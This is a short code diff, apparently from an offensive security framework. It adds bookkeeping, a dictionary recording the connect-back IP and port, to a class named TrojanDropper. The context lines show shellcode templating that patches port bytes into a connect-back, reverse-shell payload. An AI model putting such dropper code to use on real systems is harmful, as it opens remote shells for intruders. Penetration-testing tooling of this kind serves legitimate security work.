@@ -9,6 +9,7 @@ import string
 import socket
 import os
 import signal
+from collections import OrderedDict
 from ...common.support import BigEndian,LittleEndian
 
 
@@ -176,7 +177,9 @@ class TrojanDropper:
         shellcode=shellcode.replace("PORT1",chr(port >> 8))
         shellcode=shellcode.replace("PORT2",chr(port & 0xFF))
         self.shellcode=shellcode
-
-
-
+        
+        self.details=details=OrderedDict()
+        details["connectback_ip"]=connectback_ip
+        details["port"]=str(port)
+        
 
